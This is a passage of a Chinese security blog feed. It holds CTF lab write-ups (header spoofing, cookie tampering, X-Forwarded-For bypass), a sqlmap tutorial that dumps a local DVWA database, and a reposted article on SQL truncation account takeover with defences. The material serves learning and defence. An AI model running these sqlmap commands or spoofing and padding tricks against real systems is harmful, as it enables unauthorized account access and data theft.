title="7.逗比的验证码第三期（SESSION）尼玛，验证码怎么可以这样逗比。。验证码做成这样，你家里人知道吗？"></a>7.逗比的验证码第三期（SESSION）<br>尼玛，验证码怎么可以这样逗比。。<br>验证码做成这样，你家里人知道吗？</h3><p>方法和第六题一样，具体原因我也不清楚，据说是第六题记录在Cookie，而第七题是记录在Session</p><h3 id="8-微笑一下就能过关了尼玛，碰到这样的题我能笑得出来嘛…"><a href="#8-微笑一下就能过关了尼玛，碰到这样的题我能笑得出来嘛…" class="headerlink" title="8.微笑一下就能过关了尼玛，碰到这样的题我能笑得出来嘛…"></a>8.微笑一下就能过关了<br>尼玛，碰到这样的题我能笑得出来嘛…</h3><p>查看源代码<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%28LNG%2508SL%7B@%5DREHLP0U0G%25O.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;1-key又又找不到了小明这次哭了，key又找不到了！！！-key啊，你究竟藏到了哪里，为什么我看到的页面上都没有啊！！！！！！&quot;&gt;&lt;a href=&quot;#1-key又又找不到了小明这次哭了，key又找不到了！！！-key啊，你究竟藏到了哪里，为什么我看到的页面上都没
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>网络安全实验室-基础关</title>
    <link href="http://yoursite.com/2018/07/06/wangluo1/"/>
    <id>http://yoursite.com/2018/07/06/wangluo1/</id>
    <published>2018-07-06T05:24:35.617Z</published>
    <updated>2018-07-06T10:43:48.351Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-key在哪里？"><a href="#1-key在哪里？" class="headerlink" title="1.key在哪里？"></a>1.key在哪里？</h3><p>查看源代码得到key</p><h3 id="2-再加密一次你就得到key啦-加密之后的数据为xrlvf23xfqwsxsqf"><a href="#2-再加密一次你就得到key啦-加密之后的数据为xrlvf23xfqwsxsqf" class="headerlink" title="2.再加密一次你就得到key啦~ 加密之后的数据为xrlvf23xfqwsxsqf"></a>2.再加密一次你就得到key啦~ <br>加密之后的数据为xrlvf23xfqwsxsqf</h3><p>rot-13就是一种编码方式，其功能是将英文字母转换为其后第十三个字母，如果超过26则绕回开头。你可以把26个字母想象成一个字母a和字母z连在一起的环。要加密某个字母，就在环上往后数13个，第十三个就是对应的密文。<br><br><a id="more"></a><br><a href="http://www.mxcz.net/tools/rot13.aspx" target="_blank" rel="noopener">rot13在线工具网站</a></p><h3 id="3-猜猜这是经过了多少次加密-加密后的字符串为-太长了此处省略"><a href="#3-猜猜这是经过了多少次加密-加密后的字符串为-太长了此处省略" class="headerlink" title="3.猜猜这是经过了多少次加密?加密后的字符串为:(太长了此处省略)"></a>3.猜猜这是经过了多少次加密?<br>加密后的字符串为:(太长了此处省略)</h3><p>容易看出是base64码，base64多次解码,由于比较麻烦，可以写个脚本跑一下，脚本如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line">s = &quot;这里输入你要解码的base64&quot;</span><br><span class="line">a = 0</span><br><span class="line">try:</span><br><span class="line">    while True:</span><br><span class="line">    s = base64.decodestring(s)</span><br><span class="line">    a += 1</span><br><span class="line">except Exception:</span><br><span class="line">    print s</span><br><span class="line">    print a</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B009D6F82-FCC0-C39D-8FC2-F261B36C224D%7D.png" alt="image"></p><h3 id="4-据说MD5加密很安全，真的是么？"><a href="#4-据说MD5加密很安全，真的是么？" class="headerlink" title="4.据说MD5加密很安全，真的是么？"></a>4.据说MD5加密很安全，真的是么？</h3><p><a href="http://www.cmd5.com/" target="_blank" rel="noopener">http://www.cmd5.com/</a> <br><br>在线解密得到KEY：bighp</p><h3 id="5-种族歧视小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！"><a href="#5-种族歧视小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！" class="headerlink" title="5.种族歧视小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！"></a>5.种族歧视<br>小明同学今天访问了一个网站，竟然不允许中国人访问！太坑了，于是小明同学决心一定要进去一探究竟！</h3><p>用burpsuite抓包发送到Reapeater<br><br>修改Accept-Language如下:<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B5A4A3C0C-0529-1687-BCD3-DB88DBD3842C%7D.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B36A594FB-5870-F43A-AFD9-D6DDF62BB402%7D.png" alt="image"></p><h3 id="6-HAHA浏览器据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？"><a href="#6-HAHA浏览器据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？" class="headerlink" title="6.HAHA浏览器据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？"></a>6.HAHA浏览器<br>据说信息安全小组最近出了一款新的浏览器，叫HAHA浏览器，有些题目必须通过HAHA浏览器才能答对。小明同学坚决不要装HAHA浏览器，怕有后门，但是如何才能过这个需要安装HAHA浏览器才能过的题目呢？</h3><p>burpsuite抓包 把黄色地方改为HAHA<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/%7B20831218-87B3-7C98-BC5E-44E746F47FF1%7D.png" alt="image"></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%7BFDC6762A-8CB4-8B85-E271-DD2E2DBB8510%7D.png" alt="image"></p><h3 id="7-key究竟在哪里呢上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？"><a href="#7-key究竟在哪里呢上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？" class="headerlink" title="7.key究竟在哪里呢上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？"></a>7.key究竟在哪里呢<br>上一次小明同学轻松找到了key，感觉这么简单的题目多无聊，于是有了找key的加强版，那么key这次会藏在哪里呢？</h3><p>burpsuite抓包在Response响应头(Header)里发现key</p><h3 id="8-key又找不到了小明这次可真找不到key去哪里了，你能帮他找到key吗？"><a href="#8-key又找不到了小明这次可真找不到key去哪里了，你能帮他找到key吗？" class="headerlink" title="8.key又找不到了小明这次可真找不到key去哪里了，你能帮他找到key吗？"></a>8.key又找不到了<br>小明这次可真找不到key去哪里了，你能帮他找到key吗？</h3><p>用burpsuite抓包repeater发现从index.php跳转到index_no_key.php的过程中网页有一次很快的跳转<br><img src="http://p1vrkwaxt.bkt.clouddn.com/FYC%60%5B0%25WP%6049OV%7D%60@%5BR%7D%254G.png" alt="image"></p><p>这里有一个参数：Location,这是重定向，让网页跳转到index_no_key.php这个网页，<br>那么这个过程应该是这样的：在index.php网页中点击 “到这里找key”，然后会跳转到search_key.php，然后正常情况下会跳转到key_is_here_now_.php，但是在response中有个重定向location，让网页跳转到了index_no_key.php。<br><br>所以只需要把浏览器地址栏中输入：<br><a href="http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php" target="_blank" rel="noopener">http://hacklist.sinaapp.com/base8_0abd63aa54bef0464289d6a42465f354/key_is_here_now_.php</a><br>就可以得到正确的key了 。</p><h3 id="9-冒充登陆用户小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？"><a href="#9-冒充登陆用户小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？" class="headerlink" title="9.冒充登陆用户小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？"></a>9.冒充登陆用户<br>小明来到一个网站，还是想要key，但是却怎么逗登陆不了，你能帮他登陆吗？</h3><p>抓包如下:<br><img src="http://p1vrkwaxt.bkt.clouddn.com/JC5KYI%28U6L%5B2VXPDM5_GIBP.png" alt="image"><br>在Cookie发现login=0;尝试把0改成1后运行得到key</p><h3 id="10-比较数字大小只要比服务器上的数字大就可以了！"><a href="#10-比较数字大小只要比服务器上的数字大就可以了！" class="headerlink" title="10.比较数字大小只要比服务器上的数字大就可以了！"></a>10.比较数字大小<br>只要比服务器上的数字大就可以了！</h3><p>查看源代码，最大只能输入三个数字，输入999回显太小，有两种方法，第一种google修改最大length，第二种用火狐hackbar直接post<br><img src="http://p1vrkwaxt.bkt.clouddn.com/%5BTDFNL%609IA$@0Y_YIG%60S$AO.png" alt="image"></p><h3 id="11-本地的诱惑小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密-key-？"><a href="#11-本地的诱惑小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密-key-？" class="headerlink" title="11.本地的诱惑小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？"></a>11.本地的诱惑<br>小明扫描了他心爱的小红的电脑，发现开放了一个80端口，但是当小明去访问的时候却发现只允许从本地访问，可他心爱的小红不敢让这个诡异的小明触碰她的电脑，可小明真的想知道小红电脑的80端口到底隐藏着什么秘密(key)？</h3><p>burpsuite抓包添加:X-Forwarded-For:127.0.0.1<br>下面给出复现的代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">//print_r($_SERVER);</span><br><span class="line">$arr=explode(&apos;,&apos;,$_SERVER[&apos;HTTP_X_FORWARDED_FOR&apos;]);</span><br><span class="line">if($arr[0]==&apos;127.0.0.1&apos;)&#123;</span><br><span class="line">    //key</span><br><span class="line">    echo &quot;key is ^&amp;*(UIHKJjkadshf&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;必须从本地访问！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="12-就不让你访问小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方…-可最后还是被黑客找到了，并被放置了一个黑页，写到-find-you-no-more-than-3-secs"><a href="#12-就不让你访问小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方…-可最后还是被黑客找到了，并被放置了一个黑页，写到-find-you-no-more-than-3-secs" class="headerlink" title="12.就不让你访问小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!"></a>12.就不让你访问<br>小明设计了一个网站，因为总是遭受黑客攻击后台，所以这次他把后台放到了一个无论是什么人都找不到的地方….可最后还是被黑客找到了，并被放置了一个黑页，写到:find you ,no more than 3 secs!</h3><p>原理:robots协议 网站通过Robots协议告诉搜索引擎哪些页面可以抓取，哪些页面不能抓取。<br><img src="http://p1vrkwaxt.bkt.clouddn.com/68%5B6192D%29VDG7ZZ$BK%5D%60F%29Y.png" alt="image"><br>访问Disallow<br><br>得到如下回显:<br></p><h4 id="you-find-me-but-I-am-not-the-login-page-keep-search"><a href="#you-find-me-but-I-am-not-the-login-page-keep-search" class="headerlink" title="you find me,but I am not the login page. keep search."></a>you find me,but I am not the login page. keep search.</h4><p>尝试输入login.php,得到flag</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;1-key在哪里？&quot;&gt;&lt;a href=&quot;#1-key在哪里？&quot; class=&quot;headerlink&quot; title=&quot;1.key在哪里？&quot;&gt;&lt;/a&gt;1.key在哪里？&lt;/h3&gt;&lt;p&gt;查看源代码得到key&lt;/p&gt;
&lt;h3 id=&quot;2-再加密一次你就得到key啦-加密之后的数据为xrlvf23xfqwsxsqf&quot;&gt;&lt;a href=&quot;#2-再加密一次你就得到key啦-加密之后的数据为xrlvf23xfqwsxsqf&quot; class=&quot;headerlink&quot; title=&quot;2.再加密一次你就得到key啦~ 加密之后的数据为xrlvf23xfqwsxsqf&quot;&gt;&lt;/a&gt;2.再加密一次你就得到key啦~ &lt;br&gt;加密之后的数据为xrlvf23xfqwsxsqf&lt;/h3&gt;&lt;p&gt;rot-13就是一种编码方式，其功能是将英文字母转换为其后第十三个字母，如果超过26则绕回开头。你可以把26个字母想象成一个字母a和字母z连在一起的环。要加密某个字母，就在环上往后数13个，第十三个就是对应的密文。&lt;br&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqlmap基础用法</title>
    <link href="http://yoursite.com/2018/07/06/sqlmap/"/>
    <id>http://yoursite.com/2018/07/06/sqlmap/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:30.322Z</updated>
    
    <content type="html"><![CDATA[<p>参考链接:<a href="https://blog.csdn.net/qq_38412357/article/details/79559039" target="_blank" rel="noopener">https://blog.csdn.net/qq_38412357/article/details/79559039</a></p><h2 id="sqlmap入门-post"><a href="#sqlmap入门-post" class="headerlink" title="sqlmap入门(post)"></a>sqlmap入门(post)</h2><p>不知道什么原因，这个平台测试不了，卡在一半，于是在本地的DVWA测试成功了，下面就以DVWA为例子（low级别的sql injection）<br><a id="more"></a><br>这是个典型的post注入，这里抓包一下<br><br><img src="http://p1vrkwaxt.bkt.clouddn.com/YSRK2B0%289Q4R%29D%5B6G%606JYHL.png" alt="image"></p><p>然后把抓到的内容全部复制在txt文本中.(这里我保存在自己的D盘下的2.txt里)</p><p>然后打开sqlmap,输入如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;D:\2.txt&quot; -p id --dbs</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/$PFB$5$SPEMDJM_%7D1~@%25K3Y.png" alt="image"></p><p>可以看到sqlmap获得了数据库的名字,-r是读文件 后面是刚才保存的绝对路径，-p是参数，也就是注入点（id是注入点） –dbs意思是爆数据库名称</p><p>接下来是爆表(这里尝试爆数据库dvwa下的表)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;D:\2.txt&quot; -p id -D dvwa --tables</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/0%5B%7DY4ULHORM%7B9$D%7DK1Q%5BTZ4.png" alt="image"></p><p>可以看到爆出了表</p><p>然后爆字段（这里爆user表下的字段）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;D:\2.txt&quot; -p id -D dvwa -T users --columns</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%28XAC%7DV%5BS8@NOMSFAP%282%259OA.png" alt="image"></p><p>爆出了当前users表下的字段</p><p>最后爆字段内容(这里任取字段user)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -r &quot;D:\2.txt&quot; -p id -D dvwa -T users -C user --dump</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/H6DV~%28%25M@TLRN$08%604R7FV1.png" alt="image"></p><p>成功爆出字段内容</p><h2 id="sqlmap入门-get"><a href="#sqlmap入门-get" class="headerlink" title="sqlmap入门(get)"></a>sqlmap入门(get)</h2><p><a href="https://blog.csdn.net/zgyulongfei/article/details/41017493" target="_blank" rel="noopener">https://blog.csdn.net/zgyulongfei/article/details/41017493</a></p><p>这个要更简单点</p><h2 id="总结，有些情况的题目的waf可以ban了sqlmap，具体情况具体分析"><a href="#总结，有些情况的题目的waf可以ban了sqlmap，具体情况具体分析" class="headerlink" title="总结，有些情况的题目的waf可以ban了sqlmap，具体情况具体分析"></a>总结，有些情况的题目的waf可以ban了sqlmap，具体情况具体分析</h2>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参考链接:&lt;a href=&quot;https://blog.csdn.net/qq_38412357/article/details/79559039&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://blog.csdn.net/qq_38412357/article/details/79559039&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;sqlmap入门-post&quot;&gt;&lt;a href=&quot;#sqlmap入门-post&quot; class=&quot;headerlink&quot; title=&quot;sqlmap入门(post)&quot;&gt;&lt;/a&gt;sqlmap入门(post)&lt;/h2&gt;&lt;p&gt;不知道什么原因，这个平台测试不了，卡在一半，于是在本地的DVWA测试成功了，下面就以DVWA为例子（low级别的sql injection）&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>基于约束的SQL攻击</title>
    <link href="http://yoursite.com/2018/07/06/SQL%E7%BA%A6%E6%9D%9F%E6%94%BB%E5%87%BB/"/>
    <id>http://yoursite.com/2018/07/06/SQL约束攻击/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:20.411Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基于约束的SQL攻击"><a href="#基于约束的SQL攻击" class="headerlink" title="基于约束的SQL攻击"></a>基于约束的SQL攻击</h1><p>转载自:<a href="http://www.freebuf.com/articles/web/124537.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/124537.html</a></p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>最近，我遇到了一个有趣的代码片段，开发者尝试各种方法来确保数据库的安全访问。当新用户尝试注册时，将运行以下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">// Checking whether a user with the same username exists</span><br><span class="line">$username = mysql_real_escape_string($_GET[&apos;username&apos;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&apos;password&apos;]);</span><br><span class="line">$query = &quot;SELECT *</span><br><span class="line">          FROM users</span><br><span class="line">          WHERE username=&apos;$username&apos;&quot;;</span><br><span class="line">$res = mysql_query($query, $database);</span><br><span class="line">if($res) &#123;</span><br><span class="line">  if(mysql_num_rows($res) &gt; 0) &#123;</span><br><span class="line">    // User exists, exit gracefully</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">  else &#123;</span><br><span class="line">    // If not, only then insert a new entry</span><br><span class="line">    $query = &quot;INSERT INTO users(username, password)</span><br><span class="line">              VALUES (&apos;$username&apos;,&apos;$password&apos;)&quot;;</span><br><span class="line">    .</span><br><span class="line">    .</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>使用以下代码验证登录信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username = mysql_real_escape_string($_GET[&apos;username&apos;]);</span><br><span class="line">$password = mysql_real_escape_string($_GET[&apos;password&apos;]);</span><br><span class="line">$query = &quot;SELECT username FROM users</span><br><span class="line">          WHERE username=&apos;$username&apos;</span><br><span class="line">              AND password=&apos;$password&apos; &quot;;</span><br><span class="line">$res = mysql_query($query, $database);</span><br><span class="line">if($res) &#123;</span><br><span class="line">  if(mysql_num_rows($res) &gt; 0)&#123;</span><br><span class="line">      $row = mysql_fetch_assoc($res);</span><br><span class="line">      return $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">return Null;</span><br></pre></td></tr></table></figure></p><p>安全考虑:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">过滤用户输入参数了吗？ — 完成检查</span><br><span class="line">使用单引号（’）来增加安全性了吗？ — 完成检查</span><br></pre></td></tr></table></figure></p><p>按理说应该不会出错了啊？</p><p>然而，攻击者依然能够以任意用户身份进行登录！</p><h2 id="攻击技巧"><a href="#攻击技巧" class="headerlink" title="攻击技巧"></a>攻击技巧</h2><p>在谈论这种攻击手法之前，首先我们需要了解几个关键知识点。</p><p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。换句话说“vampire”等同于“vampire ”，对于绝大多数情况来说都是成立的（诸如WHERE子句中的字符串或INSERT语句中的字符串）例如以下语句的查询结果，与使用用户名“vampire”进行查询时的结果是一样的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE username=&apos;vampire     &apos;;</span><br></pre></td></tr></table></figure><p>但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。</p><p>在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅使用字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“vampire”时，实际上只能插入字符串的前5个字符，即“vampi”。</p><p>现在，让我们建立一个测试数据库来演示具体攻击过程。<br>(在本地自己的mysql上测试)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE DATABASE testing;</span><br><span class="line">Query OK, 1 row affected (0.03 sec)</span><br><span class="line">mysql&gt; USE testing;</span><br><span class="line">Database changed</span><br></pre></td></tr></table></figure></p><p>接着创建一个数据表users，其包含username和password列，并且字段的最大长度限制为25个字符。然后，我将向username字段插入“vampire”，向password字段插入“my_password”。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE TABLE users (</span><br><span class="line">    -&gt;   username varchar(25),</span><br><span class="line">    -&gt;   password varchar(25)</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.09 sec)</span><br><span class="line">mysql&gt; INSERT INTO users</span><br><span class="line">    -&gt; VALUES(&apos;vampire&apos;, &apos;my_password&apos;);</span><br><span class="line">Query OK, 1 row affected (0.11 sec)</span><br><span class="line">mysql&gt; SELECT * FROM users;</span><br><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| vampire  | my_password |</span><br><span class="line">+----------+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>为了展示尾部空白字符的修剪情况，我们可以键入下列命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users</span><br><span class="line">    -&gt; WHERE username=&apos;vampire       &apos;;</span><br><span class="line">+----------+-------------+</span><br><span class="line">| username | password    |</span><br><span class="line">+----------+-------------+</span><br><span class="line">| vampire  | my_password |</span><br><span class="line">+----------+-------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>现在我们假设一个存在漏洞的网站使用了前面提到的PHP代码来处理用户的注册及登录过程。为了侵入任意用户的帐户（在本例中为“vampire”），只需要使用用户名“vampire[许多空白符]1”和一个随机密码进行注册即可。对于选择的用户名，前25个字符应该只包含vampire和空白字符，这样做将有助于绕过检查特定用户名是否已存在的查询。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT * FROM users</span><br><span class="line">    -&gt; WHERE username=&apos;vampire                   1&apos;;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>这里的空格符至少要十八个<br><br>需要注意的是，在执行SELECT查询语句时，SQL是不会将字符串缩短为25个字符的。因此，这里将使用完整的字符串进行搜索，所以不会找到匹配的结果。接下来，当执行INSERT查询语句时，它只会插入前25个字符。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;   INSERT INTO users(username, password)</span><br><span class="line">    -&gt; VALUES (&apos;vampire                   1&apos;, &apos;random_pass&apos;);</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.05 sec)</span><br><span class="line">mysql&gt; SELECT * FROM users</span><br><span class="line">    -&gt; WHERE username=&apos;vampire&apos;;</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">| username                  | password    |</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">| vampire                   | my_password |</span><br><span class="line">| vampire                   | random_pass |</span><br><span class="line">+---------------------------+-------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></p><p>很好，现在我们检索“vampire”的，将返回两个独立用户。注意，第二个用户名实际上是“vampire”加上尾部的18个空格。现在，如果使用用户名“vampire”和密码“random_pass”登录的话，则所有搜索该用户名的SELECT查询都将返回第一个数据记录，也就是原始的数据记录。这样的话，攻击者就能够以原始用户身份登录。这个攻击已经在MySQL和SQLite上成功通过测试。我相信在其他情况下依旧适用。</p><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>毫无疑问，在进行软件开发时，需要对此类安全漏洞引起注意。我们可采取以下几项措施进行防御：</p><p>将要求或者预期具有唯一性的那些列加上UNIQUE约束。实际上这是一个涉及软件开发的重要规则，即使你的代码有维持其完整性的功能，也应该恰当的定义数据。由于’username’列具有UNIQUE约束，所以不能插入另一条记录。将会检测到两个相同的字符串，并且INSERT查询将失败。</p><p>最好使用’id’作为数据库表的主键。并且数据应该通过程序中的id进行跟踪</p><p>为了更加安全，还可以用手动调整输入参数的限制长度（依照数据库设置）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;基于约束的SQL攻击&quot;&gt;&lt;a href=&quot;#基于约束的SQL攻击&quot; class=&quot;headerlink&quot; title=&quot;基于约束的SQL攻击&quot;&gt;&lt;/a&gt;基于约束的SQL攻击&lt;/h1&gt;&lt;p&gt;转载自:&lt;a href=&quot;http://www.freebuf.com/ar
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>VM一直多次黑屏问题</title>
    <link href="http://yoursite.com/2018/07/06/vmheipeing/"/>
    <id>http://yoursite.com/2018/07/06/vmheipeing/</id>
    <published>2018-07-06T05:24:35.601Z</published>
    <updated>2018-07-06T10:43:43.572Z</updated>
    
